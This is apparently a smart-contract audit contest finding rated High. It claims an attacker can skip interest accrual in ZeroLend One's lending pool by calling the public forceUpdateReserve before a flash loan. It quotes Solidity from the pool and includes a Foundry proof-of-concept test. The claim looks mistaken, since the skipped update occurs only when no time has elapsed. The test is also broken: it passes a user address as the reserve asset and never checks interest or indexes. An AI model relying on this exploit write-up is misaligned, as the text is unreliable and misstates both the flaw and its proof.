Orbiting Glossy Hyena

High

# Bypass Of Interest Accrual Due To Flash Loan Timestamp Manipulation

## Summary
The `forceUpdateReserve` function is publicly accessible, users can call this function immediately before any direct pool operation to set the `lastUpdateTimestamp` to the current block timestamp. Consequently, when the pool operation attempts to call `updateState`, the timestamp check may causes the function to return early, skipping the state update which will cause a bypass of necessary state updates for the protocol as an attacker can manipulate the `lastUpdateTimestamp` before executing a flash loan.
## Vulnerability Detail
The attacker calls `forceUpdateReserve` [Pool.sol#L161](https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/Pool.sol#L161) to manipulate the `lastUpdateTimestamp` of a reserve to sets the `lastUpdateTimestamp` to the current block timestamp.
```solidity
  function forceUpdateReserve(address asset) public {
    DataTypes.ReserveData storage reserve = _reserves[asset];
    DataTypes.ReserveCache memory cache = reserve.cache(_totalSupplies[asset]);
    reserve.updateState(this.getReserveFactor(), cache);
  }
```

The attacker then initiates a flash loan using `flashLoanSimple`: [Pool.sol#L145](https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/Pool.sol#L145)
```solidity
  function flashLoanSimple(address receiverAddress, address asset, uint256 amount, bytes calldata params) public {
    _flashLoan(receiverAddress, asset, amount, params, DataTypes.ExtraData({interestRateData: '', hookData: ''}));
  }
```
This calls the `_flashLoan` function [PoolSetters.sol#L178](https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/PoolSetters.sol#L178) which subsequently calls `FlashLoanLogic.executeFlashLoanSimple` function [FlashLoanLogic.sol#L65](https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/logic/FlashLoanLogic.sol#L65)
then the `executeFlashLoanSimple`, function call `_handleFlashLoanRepayment` function [FlashLoanLogic.sol#L106C12-L106C37](https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/logic/FlashLoanLogic.sol#L106C12-L106C37) which Handles repayment of flashloaned assets + premium which trigger the `updateState` function [ReserveLogic.sol#L87](https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L87) to update the reserve state:
```solidity
  function updateState(DataTypes.ReserveData storage self, uint256 _reserveFactor, DataTypes.ReserveCache memory _cache) internal {
    // If time didn't pass since last stored timestamp, skip state update
    if (self.lastUpdateTimestamp == uint40(block.timestamp)) return;

    _updateIndexes(self, _cache); 
    _accrueToTreasury(_reserveFactor, self, _cache);

    self.lastUpdateTimestamp = uint40(block.timestamp);
  }
```
However, due to the manipulated timestamp, the condition ```if (self.lastUpdateTimestamp == uint40(block.timestamp)) return;``` is true, the function return early and skip the state update.
By skipping the state update, the reserve's cumulative and borrow indexes will not be updated correctly.
## Impact
During flash loan operations, the manipulation may allow attacker to bypass the correct up-to-date of  reserve state, by manipulating the `lastUpdateTimestamp` via the `forceUpdateReserve` function, an attacker can borrow and repay large sums in flash loan without updating the liquidity and borrow indexes. This results in no interest being accrued to the treasury, even though significant amounts are borrowed. Over time, This can result in a loss of revenue for the treasury, as the interest that
should be accrued to it is bypassed.

## Proof of Concept
Add the test function to [PoolFlashLoanTests.t.sol](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/test/forge/core/pool/PoolFlashLoanTests.t.sol) 
```solidity

function test_bypassFlashloans() public {
    bytes memory emptyParams;
    MockFlashLoanSimpleReceiver mockFlashSimpleReceiver = new MockFlashLoanSimpleReceiver(pool);

    _generateFlashloanCondition();

    uint256 premium = poolFactory.flashLoanPremiumToProtocol();
    emit log_named_uint("Flashloan Premium", premium);

    // Log initial balances
    emit log_named_uint("Initial balance of mockFlashSimpleReceiver", tokenA.balanceOf(address(mockFlashSimpleReceiver)));
    emit log_named_uint("Initial balance of Alice", tokenA.balanceOf(alice));
    emit log_named_uint("Initial balance of Pool contract", tokenA.balanceOf(address(pool)));
    
    // Step 1: executing the first flash loan
    vm.startPrank(alice);
    
    emit log("Executing first flash loan");

    vm.expectEmit(true, true, true, true);
    emit PoolEventsLib.FlashLoan(address(mockFlashSimpleReceiver), alice, address(tokenA), 100 ether, 0);
    emit Transfer(address(alice), address(mockFlashSimpleReceiver), 500 ether * premium);

    pool.flashLoanSimple(address(mockFlashSimpleReceiver), address(tokenA), 100 ether, emptyParams);

    // Log balances after the first flash loan
    emit log_named_uint("MockFlashSimpleReceiver after first flash loan", tokenA.balanceOf(address(mockFlashSimpleReceiver)));
    emit log_named_uint("Alice after first flash loan", tokenA.balanceOf(alice));
    emit log_named_uint("Pool contract after first flash loan", tokenA.balanceOf(address(pool)));
    
    vm.stopPrank();

    // Step 2: flash loan premium update
    poolFactory.setFlashloanPremium(0);
    premium = poolFactory.flashLoanPremiumToProtocol();
    emit log_named_uint("Updated Flashloan Premium", premium);
    assertEq(premium, 0);

    // Anyone can frontrun the repayment
    pool.forceUpdateReserve(address(alice));
    emit log("forceUpdateReserve");

    // Step 4: Executing the second flash loan
    vm.startPrank(alice);
    
    emit log_named_uint("MockFlashSimpleReceiver before second flash loan", tokenA.balanceOf(address(mockFlashSimpleReceiver)));
    emit log_named_uint("Alice before second flash loan", tokenA.balanceOf(alice));
    emit log_named_uint("Pool contract before second flash loan", tokenA.balanceOf(address(pool)));
    
    emit log("Executing second flash loan");

    vm.expectEmit(true, true, true, true);
    emit PoolEventsLib.FlashLoan(address(mockFlashSimpleReceiver), alice, address(tokenA), 100 ether, (100 ether * premium) / 10_000);
    emit Transfer(address(0), address(mockFlashSimpleReceiver), (100 ether * premium) / 10_000);

    pool.flashLoanSimple(address(mockFlashSimpleReceiver), address(tokenA), 100 ether, emptyParams);
    
    // Log balances after the second flash loan
    emit log_named_uint("MockFlashSimpleReceiver after second flash loan", tokenA.balanceOf(address(mockFlashSimpleReceiver)));
    emit log_named_uint("Alice after second flash loan", tokenA.balanceOf(alice));
    emit log_named_uint("Pool contract after second flash loan", tokenA.balanceOf(address(pool)));
    
    vm.stopPrank();
    
    emit log("Flash loan completed");

    // Log specific token transfers if possible (manual investigation)
    emit log_named_uint("Pool contract balance", tokenA.balanceOf(address(pool)));
    emit log_named_uint("Alice balance", tokenA.balanceOf(alice));
}
```

## Tool used
Manual Review

## Recommendation
Reimplement the reserve update mechanism to ensure that updateState and associated functions always apply the correct reserve factor and interest accrual, even when called during a flash loan. 
Modify the timestamp logic in `updateState` to avoid early exits in case of manipulation